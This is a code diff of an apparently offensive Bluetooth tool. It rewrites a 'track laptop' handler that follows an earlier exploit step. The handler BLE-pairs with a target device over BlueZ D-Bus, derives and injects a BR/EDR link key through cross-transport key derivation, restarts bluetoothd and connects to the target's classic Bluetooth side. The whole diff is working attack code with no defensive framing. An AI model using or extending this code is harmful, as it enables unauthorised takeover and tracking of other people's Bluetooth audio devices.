@@ -190,187 +190,308 @@ def force_hci_connection(bredr_address):
 
 
 def handle_track_laptop(data):
-    """Pair with the target device from the laptop using raw HCI for BR/EDR.
-    Requires sudo for raw HCI socket access.
+    """Pair with the target device from the laptop via BLE + CTKD for BR/EDR.
+    Uses D-Bus (BlueZ API) for reliable, event-driven BLE pairing instead of
+    scripting bluetoothctl. Requires sudo for /var/lib/bluetooth access and
+    bluetoothd restart.
     """
     bredr_address = data.get("bredr_address")
+    ble_address = data.get("ble_address")
+    device_name = data.get("device_name", "Unknown")
 
     if not bredr_address:
         emit("track:status", {"stage": "error", "message": "No BR/EDR address provided", "status": "error"})
         return
+    if not ble_address:
+        emit("track:status", {"stage": "error", "message": "No BLE address provided — run exploit first", "status": "error"})
+        return
 
     def run_laptop_pair():
-        """Pair via BLE first, then CTKD to derive BR/EDR link key."""
+        """Pair via BLE (D-Bus), then CTKD to derive BR/EDR link key."""
         from ctkd import perform_ctkd
 
-        ble_address = data.get("ble_address")
-
-        # Step 1: BLE scan + pair to get LTK
-        socketio.emit("track:status", {
-            "stage": "pairing",
-            "message": "Step 1/4: BLE scanning for device...",
-            "status": "running",
-        })
-
-        # Scan to discover the device
-        scan_proc = subprocess.Popen(
-            ["bluetoothctl"], stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
-        )
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         try:
-            scan_proc.stdin.write("scan on\n")
-            scan_proc.stdin.flush()
-            time.sleep(6)
-            scan_proc.stdin.write("scan off\n")
-            scan_proc.stdin.flush()
-            time.sleep(1)
-            scan_proc.stdin.write("quit\n")
-            scan_proc.stdin.flush()
-            scan_proc.wait(timeout=3)
-        except Exception:
-            if scan_proc.poll() is None:
-                scan_proc.terminate()
-
-        # Find the WF-C510 BLE address
-        dev_result = subprocess.run(
-            ["bluetoothctl", "devices"],
-            capture_output=True, text=True, timeout=5,
-        )
-        ble_addr = None
-        for line in dev_result.stdout.splitlines():
-            if "C510" in line:
-                parts = line.split()
-                if len(parts) >= 2:
-                    ble_addr = parts[1]
-                    break
-
-        if not ble_addr:
+            loop.run_until_complete(_laptop_pair_async(ble_address, bredr_address, device_name))
+        except Exception as e:
             socketio.emit("track:status", {
                 "stage": "complete",
-                "message": "Device not found via BLE scan.",
-                "status": "warning",
+                "message": f"Laptop pairing error: {e}",
+                "status": "error",
             })
-            return
-
-        socketio.emit("track:status", {
-            "stage": "pairing",
-            "message": f"Step 2/4: BLE pairing with {ble_addr}...",
-            "status": "running",
-        })
-
-        # Pair via BLE
-        pair_proc = subprocess.Popen(
-            ["bluetoothctl"], stdin=subprocess.PIPE,
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
-        )
-        try:
-            pair_proc.stdin.write("agent on\n")
-            pair_proc.stdin.flush()
-            time.sleep(2)
-            pair_proc.stdin.write("default-agent\n")
-            pair_proc.stdin.flush()
-            time.sleep(1)
-            pair_proc.stdin.write(f"trust {ble_addr}\n")
-            pair_proc.stdin.flush()
-            time.sleep(1)
-            pair_proc.stdin.write(f"pair {ble_addr}\n")
-            pair_proc.stdin.flush()
-            time.sleep(10)
-            pair_proc.stdin.write("quit\n")
-            pair_proc.stdin.flush()
-            pair_proc.communicate(timeout=5)
-        except Exception:
-            if pair_proc.poll() is None:
-                pair_proc.terminate()
-
-        # Check if LE pairing created an LTK
-        check = subprocess.run(
-            ["bluetoothctl", "info", ble_addr],
-            capture_output=True, text=True, timeout=5,
-        )
-        le_paired = "Paired: yes" in check.stdout
-
-        if not le_paired:
-            socketio.emit("track:status", {
-                "stage": "complete",
-                "message": f"BLE pairing with {ble_addr} failed.",
-                "status": "warning",
-            })
-            return
-
-        socketio.emit("track:status", {
-            "stage": "pairing",
-            "message": "Step 3/4: Deriving BR/EDR Link Key via CTKD...",
-            "status": "running",
-        })
-
-        # Step 2: CTKD — derive BR/EDR link key from LE LTK
-        success, msg, link_key_hex = perform_ctkd("C510", bredr_address, "WF-C510")
-
-        socketio.emit("track:status", {
-            "stage": "pairing",
-            "message": msg[:120],
-            "status": "running" if success else "warning",
-        })
-
-        if not success:
-            socketio.emit("track:status", {
-                "stage": "complete",
-                "message": f"CTKD failed: {msg}",
-                "status": "warning",
-            })
-            return
-
-        # Step 3: bluetoothd was restarted by CTKD. Connect with derived key.
-        socketio.emit("track:status", {
-            "stage": "pairing",
-            "message": f"Step 4/4: Connecting to {bredr_address} with derived Link Key...",
-            "status": "running",
-        })
-
-        connect_r = subprocess.run(
-            ["bluetoothctl", "connect", bredr_address],
-            capture_output=True, text=True, timeout=15,
-        )
-
-        socketio.emit("track:status", {
-            "stage": "pairing",
-            "message": f"Connect: {connect_r.stdout.strip()[:80]}",
-            "status": "running",
-        })
-
-        # Verify
-        time.sleep(2)
-        check = subprocess.run(
-            ["bluetoothctl", "info", bredr_address],
-            capture_output=True, text=True, timeout=5,
-        )
-        is_paired = "Paired: yes" in check.stdout
-        is_connected = "Connected: yes" in check.stdout
-
-        if is_connected:
-            socketio.emit("track:status", {
-                "stage": "complete",
-                "message": f"Laptop connected to {bredr_address} via CTKD! Link Key derived from LE bond.",
-                "status": "success",
-                "bredr_address": bredr_address,
-            })
-        elif is_paired:
-            socketio.emit("track:status", {
-                "stage": "complete",
-                "message": f"Link Key injected. Device paired but not connected. Try again or check audio profiles.",
-                "status": "success",
-                "bredr_address": bredr_address,
-            })
-        else:
-            socketio.emit("track:status", {
-                "stage": "complete",
-                "message": f"CTKD derived key injected but connection failed. The device may have rejected the derived key.",
-                "status": "warning",
-            })
+        finally:
+            loop.close()
 
     thread = threading.Thread(target=run_laptop_pair, daemon=True)
     thread.start()
+
+
+async def _laptop_pair_async(ble_address, bredr_address, device_name):
+    """Async laptop pairing flow using D-Bus for BLE and CTKD for BR/EDR."""
+    from dbus_fast.aio import MessageBus
+    from dbus_fast import BusType, Variant
+    from ctkd import perform_ctkd
+
+    BLUEZ_SERVICE = "org.bluez"
+    ADAPTER_IFACE = "org.bluez.Adapter1"
+    DEVICE_IFACE = "org.bluez.Device1"
+    AGENT_MANAGER_IFACE = "org.bluez.AgentManager1"
+    PROPERTIES_IFACE = "org.freedesktop.DBus.Properties"
+    OBJECT_MANAGER_IFACE = "org.freedesktop.DBus.ObjectManager"
+
+    def status(msg, stage="pairing", status="running"):
+        socketio.emit("track:status", {"stage": stage, "message": msg, "status": status})
+
+    status(f"Step 1/4: Discovering {ble_address} via BLE...")
+
+    bus = await MessageBus(bus_type=BusType.SYSTEM).connect()
+
+    try:
+        # Find the adapter object path
+        introspection = await bus.introspect(BLUEZ_SERVICE, "/")
+        obj_manager = bus.get_proxy_object(BLUEZ_SERVICE, "/",
+                                           introspection)
+        manager = obj_manager.get_interface(OBJECT_MANAGER_IFACE)
+        objects = await manager.call_get_managed_objects()
+
+        adapter_path = None
+        for path, ifaces in objects.items():
+            if ADAPTER_IFACE in ifaces:
+                adapter_path = path
+                break
+
+        if not adapter_path:
+            status("No Bluetooth adapter found via D-Bus", stage="complete", status="error")
+            return
+
+        # Get adapter proxy and start discovery
+        adapter_intro = await bus.introspect(BLUEZ_SERVICE, adapter_path)
+        adapter_obj = bus.get_proxy_object(BLUEZ_SERVICE, adapter_path, adapter_intro)
+        adapter = adapter_obj.get_interface(ADAPTER_IFACE)
+        adapter_props = adapter_obj.get_interface(PROPERTIES_IFACE)
+
+        # Ensure adapter is powered on
+        try:
+            powered = await adapter_props.call_get(ADAPTER_IFACE, "Powered")
+            if not powered.value:
+                await adapter_props.call_set(ADAPTER_IFACE, "Powered", Variant("b", True))
+                await asyncio.sleep(1)
+        except Exception:
+            pass
+
+        # Start discovery
+        try:
+            await adapter.call_start_discovery()
+        except Exception:
+            pass  # May already be discovering
+
+        # Wait for the device to appear in BlueZ's object tree
+        dev_path = None
+        addr_part = ble_address.upper().replace(":", "_")
+        expected_path = f"{adapter_path}/dev_{addr_part}"
+
+        for attempt in range(15):  # Up to 15 seconds
+            objects = await manager.call_get_managed_objects()
+            if expected_path in objects:
+                dev_path = expected_path
+                break
+            await asyncio.sleep(1)
+
+        try:
+            await adapter.call_stop_discovery()
+        except Exception:
+            pass
+
+        if not dev_path:
+            status(f"Device {ble_address} not found after BLE scan. "
+                   f"Make sure the device is nearby and awake.",
+                   stage="complete", status="warning")
+            return
+
+        status(f"Step 2/4: BLE pairing with {ble_address}...")
+
+        # Get device proxy
+        dev_intro = await bus.introspect(BLUEZ_SERVICE, dev_path)
+        dev_obj = bus.get_proxy_object(BLUEZ_SERVICE, dev_path, dev_intro)
+        device = dev_obj.get_interface(DEVICE_IFACE)
+        dev_props = dev_obj.get_interface(PROPERTIES_IFACE)
+
+        # Trust the device first (enables auto-accept for Just Works)
+        try:
+            await dev_props.call_set(DEVICE_IFACE, "Trusted", Variant("b", True))
+        except Exception:
+            pass
+
+        # Check if already paired
+        paired_var = await dev_props.call_get(DEVICE_IFACE, "Paired")
+        if paired_var.value:
+            status(f"Device {ble_address} already paired, skipping to CTKD...")
+        else:
+            # Pair — this triggers SMP and creates the LTK in BlueZ storage
+            pair_done = asyncio.Event()
+            pair_error = None
+
+            def on_props_changed(iface, changed, invalidated):
+                nonlocal pair_error
+                if iface == DEVICE_IFACE and "Paired" in changed:
+                    if changed["Paired"].value:
+                        pair_done.set()
+
+            dev_props.on_properties_changed(on_props_changed)
+
+            try:
+                await device.call_pair()
+            except Exception as e:
+                err_str = str(e)
+                if "AlreadyExists" in err_str:
+                    pair_done.set()
+                else:
+                    status(f"BLE pairing failed: {e}", stage="complete", status="warning")
+                    return
+
+            try:
+                await asyncio.wait_for(pair_done.wait(), timeout=20.0)
+            except asyncio.TimeoutError:
+                # Check one more time — the signal may have been missed
+                paired_var = await dev_props.call_get(DEVICE_IFACE, "Paired")
+                if not paired_var.value:
+                    status(f"BLE pairing with {ble_address} timed out. "
+                           f"Device may require interaction.",
+                           stage="complete", status="warning")
+                    return
+
+        status("BLE paired. Step 3/4: Deriving BR/EDR Link Key via CTKD...")
+
+        # Give BlueZ a moment to flush the LTK to disk
+        await asyncio.sleep(1)
+
+        # CTKD — derive BR/EDR link key from LE LTK
+        success, msg, link_key_hex = perform_ctkd(
+            bredr_address,
+            ble_address=ble_address,
+            device_name_hint=device_name if device_name != "Unknown" else None,
+            device_name=device_name,
+        )
+
+        status(msg[:140], status="running" if success else "warning")
+
+        if not success:
+            status(f"CTKD failed: {msg}", stage="complete", status="warning")
+            return
+
+        # bluetoothd was restarted by CTKD — reconnect to D-Bus
+        await asyncio.sleep(1)
+        bus2 = await MessageBus(bus_type=BusType.SYSTEM).connect()
+
+        status(f"Step 4/4: Connecting to {bredr_address} with derived Link Key...")
+
+        try:
+            # After bluetoothd restart, the BR/EDR device should appear as paired
+            bredr_part = bredr_address.upper().replace(":", "_")
+
+            # Re-discover adapter path (may change after restart)
+            intro2 = await bus2.introspect(BLUEZ_SERVICE, "/")
+            om2 = bus2.get_proxy_object(BLUEZ_SERVICE, "/", intro2)
+            mgr2 = om2.get_interface(OBJECT_MANAGER_IFACE)
+            objects2 = await mgr2.call_get_managed_objects()
+
+            adapter_path2 = None
+            for path, ifaces in objects2.items():
+                if ADAPTER_IFACE in ifaces:
+                    adapter_path2 = path
+                    break
+
+            bredr_dev_path = f"{adapter_path2}/dev_{bredr_part}"
+
+            if bredr_dev_path not in objects2:
+                # Device not yet visible — give BlueZ more time to load keys
+                await asyncio.sleep(2)
+                objects2 = await mgr2.call_get_managed_objects()
+
+            if bredr_dev_path in objects2:
+                bredr_intro = await bus2.introspect(BLUEZ_SERVICE, bredr_dev_path)
+                bredr_obj = bus2.get_proxy_object(BLUEZ_SERVICE, bredr_dev_path, bredr_intro)
+                bredr_dev = bredr_obj.get_interface(DEVICE_IFACE)
+                bredr_props = bredr_obj.get_interface(PROPERTIES_IFACE)
+
+                # Trust it so BlueZ doesn't block the connection
+                try:
+                    await bredr_props.call_set(DEVICE_IFACE, "Trusted", Variant("b", True))
+                except Exception:
+                    pass
+
+                # Connect
+                connect_done = asyncio.Event()
+
+                def on_bredr_changed(iface, changed, invalidated):
+                    if iface == DEVICE_IFACE and "Connected" in changed:
+                        if changed["Connected"].value:
+                            connect_done.set()
+
+                bredr_props.on_properties_changed(on_bredr_changed)
+
+                await bredr_dev.call_connect()
+
+                try:
+                    await asyncio.wait_for(connect_done.wait(), timeout=10.0)
+                except asyncio.TimeoutError:
+                    pass
+
+                # Verify final state
+                connected_var = await bredr_props.call_get(DEVICE_IFACE, "Connected")
+                paired_var = await bredr_props.call_get(DEVICE_IFACE, "Paired")
+
+                if connected_var.value:
+                    socketio.emit("track:status", {
+                        "stage": "complete",
+                        "message": f"Laptop connected to {bredr_address} via CTKD! "
+                                   f"Link Key derived from LE bond.",
+                        "status": "success",
+                        "bredr_address": bredr_address,
+                    })
+                elif paired_var.value:
+                    socketio.emit("track:status", {
+                        "stage": "complete",
+                        "message": f"Link Key injected. Device paired but not connected — "
+                                   f"try connecting manually or check audio profiles.",
+                        "status": "success",
+                        "bredr_address": bredr_address,
+                    })
+                else:
+                    status(
+                        f"CTKD key injected but connection failed. "
+                        f"The device may not support CTKD or may have rejected the key.",
+                        stage="complete", status="warning",
+                    )
+            else:
+                # BlueZ doesn't see the BR/EDR device — fall back to bluetoothctl connect
+                connect_r = subprocess.run(
+                    ["bluetoothctl", "connect", bredr_address],
+                    capture_output=True, text=True, timeout=15,
+                )
+                if "Connection successful" in connect_r.stdout:
+                    socketio.emit("track:status", {
+                        "stage": "complete",
+                        "message": f"Laptop connected to {bredr_address} via CTKD (bluetoothctl fallback).",
+                        "status": "success",
+                        "bredr_address": bredr_address,
+                    })
+                else:
+                    status(
+                        f"CTKD key injected but BR/EDR device not visible to BlueZ. "
+                        f"Try: bluetoothctl connect {bredr_address}",
+                        stage="complete", status="warning",
+                    )
+        except Exception as e:
+            status(
+                f"BR/EDR connection step failed: {e}",
+                stage="complete", status="warning",
+            )
+        finally:
+            bus2.disconnect()
+    finally:
+        bus.disconnect()
 
 
 def handle_track_phone(data):
